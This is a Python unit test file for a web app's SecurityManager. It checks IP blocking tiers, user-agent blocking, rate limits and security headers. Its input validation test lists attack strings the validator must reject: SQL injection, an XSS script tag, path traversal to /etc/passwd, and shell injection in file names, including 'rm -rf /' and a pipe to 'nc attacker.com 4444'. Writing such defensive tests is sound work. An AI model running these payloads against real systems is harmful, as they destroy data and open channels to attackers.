#!/usr/bin/env python3
"""Unit tests for the SecurityManager (Stage 3, #15).

Why this file exists: the shell test scripts drive the security layer over
HTTP from localhost — but SecurityManager whitelists 127.0.0.1 BEFORE every
blocking/rate-limit check, so no HTTP test from localhost can ever trigger
a block, a tier, or a rate limit. Those scripts could only ever pass
vacuously (or fail for the wrong reasons). The real logic is tested here,
directly, with a non-localhost IP (TEST-NET-3 203.0.113.7) against a
throwaway temp database. Run: python3 tests/test_security_units.py
(exit 0 = all pass). No server needed.
"""
import os
import sqlite3
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.ai3d.utils.security import SecurityManager, create_security_headers

FAKE_IP = '203.0.113.7'  # TEST-NET-3, never a real client


class SecurityUnitsTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.db = os.path.join(self.tmp.name, 'security.db')
        self.sm = SecurityManager(self.db)

    def tearDown(self):
        self.tmp.cleanup()

    def _tier(self, ip):
        conn = sqlite3.connect(self.db)
        row = conn.execute(
            'SELECT tier_level, violation_count FROM blocked_ips '
            'WHERE ip_address = ?', (ip,)).fetchone()
        conn.close()
        return row

    # -- localhost whitelist -------------------------------------------------
    def test_localhost_is_whitelisted_by_design(self):
        for ip in ('127.0.0.1', 'localhost', '::1'):
            safe, reason = self.sm.check_request_security(
                ip, '/api/generate', 'sqlmap/1.0')
            self.assertTrue(safe, f'{ip} must be whitelisted: {reason}')

    def test_non_localhost_is_not_whitelisted(self):
        safe, _ = self.sm.check_request_security(
            FAKE_IP, '/', 'Mozilla/5.0')
        self.assertTrue(safe)  # clean request passes; the point is the
        # whitelist did not short-circuit (proven by the UA test below).

    # -- suspicious user agent ----------------------------------------------
    def test_suspicious_user_agent_blocks_non_localhost(self):
        safe, reason = self.sm.check_request_security(
            FAKE_IP, '/', 'sqlmap/1.0')
        self.assertFalse(safe, 'sqlmap UA must be blocked')
        self.assertTrue(self.sm.is_ip_blocked(FAKE_IP))

    # -- tier math (severity + thresholds) -----------------------------------
    # BLOCKING_TIERS: 1 warning, 2 minor, 3 moderate, 5 serious, 7 severe,
    # 10 critical, 15 extreme, 20 persistent; >= 30 permanent.
    # Severity: sql_injection 3, xss_attempt 2, invalid_input 1.
    # _block_ip counts prior attack_log rows (90d) + severity.
    def test_first_low_severity_offense_is_warning(self):
        self.sm._block_ip(FAKE_IP, 'test', attack_type='invalid_input')
        self.assertEqual(self._tier(FAKE_IP), ('warning', 1))

    def test_second_low_severity_offense_is_minor(self):
        self.sm._log_attack(FAKE_IP, 'invalid_input', '/x')
        self.sm._block_ip(FAKE_IP, 'test', attack_type='invalid_input')
        self.assertEqual(self._tier(FAKE_IP), ('minor', 2))

    def test_single_sql_injection_is_moderate_not_warning(self):
        # One SQLi carries severity 3, so the count lands on 3 -> moderate.
        # The old shell script expected 'warning' here; that contradicted
        # the severity math.
        self.sm._block_ip(FAKE_IP, 'test', attack_type='sql_injection')
        self.assertEqual(self._tier(FAKE_IP), ('moderate', 3))

    def test_sql_injection_escalates_to_serious(self):
        for _ in range(2):
            self.sm._log_attack(FAKE_IP, 'sql_injection', '/x')
        self.sm._block_ip(FAKE_IP, 'test', attack_type='sql_injection')
        self.assertEqual(self._tier(FAKE_IP), ('serious', 5))

    def test_xss_is_minor_on_first_offense(self):
        self.sm._block_ip(FAKE_IP, 'test', attack_type='xss_attempt')
        self.assertEqual(self._tier(FAKE_IP), ('minor', 2))

    def test_thirty_violations_is_permanent(self):
        for _ in range(27):
            self.sm._log_attack(FAKE_IP, 'sql_injection', '/x')
        self.sm._block_ip(FAKE_IP, 'test', attack_type='sql_injection')
        self.assertEqual(self._tier(FAKE_IP)[0], 'permanent')

    def test_blocked_ip_is_refused(self):
        self.sm._block_ip(FAKE_IP, 'test', attack_type='sql_injection')
        safe, _ = self.sm.check_request_security(FAKE_IP, '/', 'Mozilla/5.0')
        self.assertFalse(safe)

    # -- input validation ------------------------------------------------------
    def test_validate_input_blocks_attacks(self):
        bad = [
            ("test'; DROP TABLE users--", 'general'),
            ("<script>alert(1)</script>", 'general'),
            ("../../../etc/passwd", 'path'),
            # Shell metacharacters in a model path (Stage 3: the old
            # general patterns missed these entirely).
            ("test.obj; rm -rf /", 'path'),
            ("test.obj$(whoami)", 'path'),
            ("test.obj`whoami`", 'path'),
            ("test.obj | nc attacker.com 4444", 'path'),
        ]
        for payload, kind in bad:
            safe, _ = self.sm.validate_input(payload, kind)
            self.assertFalse(safe, f'should block: {payload!r}')

    def test_validate_input_allows_clean_paths(self):
        for payload in ('outputs/temp_example_preview.obj',
                        'my-model_v2.obj', 'texture.png'):
            safe, _ = self.sm.validate_input(payload, 'path')
            self.assertTrue(safe, f'should allow: {payload!r}')

    # -- rate limits -----------------------------------------------------------
    def test_generate_rate_limit_is_five_per_minute(self):
        allowed = 0
        for _ in range(7):
            ok, _ = self.sm.check_rate_limit(FAKE_IP, '/api/generate')
            if ok:
                allowed += 1
        self.assertEqual(allowed, 5)

    # -- security headers ------------------------------------------------------
    def test_security_headers_present(self):
        headers = create_security_headers()
        for name in ('X-Content-Type-Options', 'X-Frame-Options',
                     'Content-Security-Policy'):
            self.assertIn(name, headers)


if __name__ == '__main__':
    unittest.main(verbosity=2)
